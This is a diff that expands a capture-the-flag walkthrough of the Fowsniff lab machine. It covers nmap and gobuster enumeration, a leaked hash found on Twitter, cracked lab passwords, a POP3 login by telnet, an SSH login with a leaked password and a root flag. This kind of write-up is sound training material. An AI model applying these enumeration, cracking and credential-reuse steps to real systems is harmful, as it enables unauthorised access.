@@ -1,6 +1,18 @@
+**Tristan Gomez**
+
+# Description
+```
+This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!
+
+This will be structured to go through what you need to do, step by step. Make sure you are connected to our network
+
+Credit to berzerk0 for creating this machine. This machine is used here with the explicit permission of the creator <3
+```
+
+# Walkthrough
 
 
-initial nmap scan
+I began the challenge with a simple nmap scan, just passing in the -sV flag to get versions of any running services.
 ```
 └─$ sudo nmap -sV 10.10.252.153
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-10 13:13 PST
@@ -19,23 +31,18 @@ Nmap done: 1 IP address (1 host up) scanned in 16.52 seconds
 
 ```
 
-on 10.10.252.153 site
+Looks like we have a website running, so I opened `http://10.10.252.153` in my browser. In the source for the page we can see...
 ```
-<p>Fowsniff's internal system suffered a data breach that
-									resulted in the exposure of employee usernames and passwords.</p>
+<p>Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.</p>
 
-									<p><strong>Client information was not affected.</strong></p>
+<p><strong>Client information was not affected.</strong></p>
 
-									<p>Due to the strong possibility that employee information has
-									been  made publicly available, all employees have been
-								  instructed to change their passwords immediately.</p>
+<p>Due to the strong possibility that employee information has been  made publicly available, all employees have been instructed to change their passwords immediately.</p>
 
-									<p>The attackers were also able to hijack our official @fowsniffcorp Twitter account.
-									All of our official tweets have been deleted and the attackers
-									may release sensitive information via this medium. We are
+<p>The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are
 ```
 
-gobuster scan
+I am going to run a gobuster scan to enumerate web pages to see what we can find.
 ```
 ─$ gobuster dir -w common.txt -x php,html,txt,js -u 10.10.252.153
 ===============================================================
@@ -80,13 +87,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /server-status        (Status: 403) [Size: 301] 
 ```
 
-searching Twitter, I found `FowsniffCorp Pwned!` tweet.
+Doing some OSINT by searching Twitter, I found `FowsniffCorp Pwned!` tweet.
 ```
 Is that your sysadmin? roflcopter
 stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
 ```
 
-doing more online searching I found a pastbin dump
+Doing more online searching I found a pastbin dump
 ```
 FOWSNIFF CORP PASSWORD LEAK
             ''~``
@@ -137,18 +144,19 @@ to any real persons or organizations.
 Any similarities to actual people or entities is purely coincidental and occurred accidentally.
 ```
 
-after cracking hashes
- ```
+
+So we have some user names and password hashes. Using hashcat to crack the hashes, I found the below results. As you can see the only user whose hash I couldn't crack was `stone`.
+```
 mauer@fowsniff:mailcall
 mustikka@fowsniff:bilbo101
 tegel@fowsniff:apples01
 baksteen@fowsniff:skyler22
 seina@fowsniff:scoobydoo2
-stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd -> uncracked
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd 
 mursten@fowsniff:carp4ever
 parede@fowsniff:orlando12
 sciana@fowsniff:07011972
- ```
+```
 
 Lets connect to POP3 via telnet using `seina:scoobydoo2`. This person has two messages!
 
@@ -254,6 +262,8 @@ AJ had been telling us to do that right before Captain Profanity showed up.
 ```
 
 
+So we have a temporary ssh password, `S1ck3nBluff+secureshell` but I don't know which user is belongs to. Performing an exhaustive search, I found that it belongs to none of my known users, but there is a user `baksteen` who appears in the two found messages.
+
 Let's ssh in as `baksteen:S1ck3nBluff+secureshell`.
 ```
 baksteen@fowsniff:~$ uname -a
@@ -291,6 +301,7 @@ root
 
 ```
 
+Woo! We are root. Let's get the last flag and finish this challenge up.
 ```
 root@fowsniff:/root# cat flag.txt
    ___                        _        _      _   _             _ 
